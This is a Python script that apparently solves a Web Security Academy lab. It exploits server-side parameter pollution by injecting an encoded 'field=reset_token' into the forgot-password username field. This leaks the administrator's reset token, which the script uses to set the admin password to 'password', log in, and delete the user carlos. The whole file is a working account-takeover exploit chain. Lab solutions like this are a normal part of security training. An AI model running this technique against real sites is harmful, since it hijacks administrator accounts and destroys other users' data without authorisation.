import requests 
import json
from bs4 import BeautifulSoup

# Grab reset_token via exploiting server-side param pollution
def grab_reset_token(url: str, endpoint: str) -> str:
    s = requests.Session()
    r = s.get(url + endpoint)
    p = BeautifulSoup(r.content, "lxml")
    csrf = p.find(attrs = {'name' : 'csrf'})['value']

    body = {
        "csrf": csrf,
        "username": "administrator%26"+"field=reset_token%23"
    }
    r = s.post(url + endpoint, data=body)
    return r.json()["result"]

# Reset admin password using the reset_token
def reset_admin_pw(url: str, endpoint: str, reset_token: str):
    s = requests.Session()
    r = s.get(url + endpoint)
    p = BeautifulSoup(r.content, "lxml")
    csrf = p.find(attrs = {'name' : 'csrf'})['value']

    body = {
        "csrf": csrf,
        "reset_token": reset_token,
        "new-password-1": "password",
        "new-password-2": "password"
    }
    r = s.post(url + "/forgot-password?reset_token=" + reset_token, data=body)
    return r.status_code

# Login as admin
def admin_login(url: str, endpoint: str):
    s = requests.Session()
    r = s.get(url + endpoint)
    p = BeautifulSoup(r.content, "lxml")
    csrf = p.find(attrs = {'name' : 'csrf'})['value']

    body = {
        "csrf": csrf,
        "username": "administrator",
        "password": "password"
    }
    r = s.post(url + endpoint, data=body)
    return s.cookies.get_dict()

# Delete carlos
def delete_carlos(url: str, endpoint: str):
    session = admin_login(url, endpoint)
    r = requests.get(url+"/admin/delete?username=carlos", cookies=session)
    return r.status_code, r.text

if __name__ == '__main__':
    url = "https://0a0f00e304acd4c29080ea7d00b60077.web-security-academy.net"
    forgot_password = "/forgot-password"
    login = "/login"
    reset_token = grab_reset_token(url, forgot_password)
    print(reset_admin_pw(url, forgot_password, reset_token))
    print(delete_carlos(url, login))